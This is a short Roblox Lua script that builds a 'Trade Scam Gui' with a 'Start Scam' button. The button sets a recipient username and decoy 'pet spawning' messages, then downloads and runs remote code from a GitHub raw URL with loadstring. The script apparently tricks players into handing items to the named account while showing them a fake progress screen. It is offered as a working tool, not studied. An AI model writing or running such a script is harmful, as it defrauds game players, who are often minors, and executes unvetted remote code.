
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Trade Scam Gui", "DarkTheme")

local Tab = Window:NewTab("TradeScam")

local Section = Tab:NewSection("TradeScam")

Section:NewButton("Start Scam", "ButtonInfo", function()
    print("Clicked")
UserName = "XXxxGamer12345xxXX"
_G.AntiLeave = false
_G.ScriptName = "Spawning Pets Pls Wait"
_G.FirstText = "Pet Spawning..."
_G.SecondText = "Pet Spawned Successfully..."
_G.ThirdText = "Almost Done..."
_G.WaitingTime = 30
loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
end)


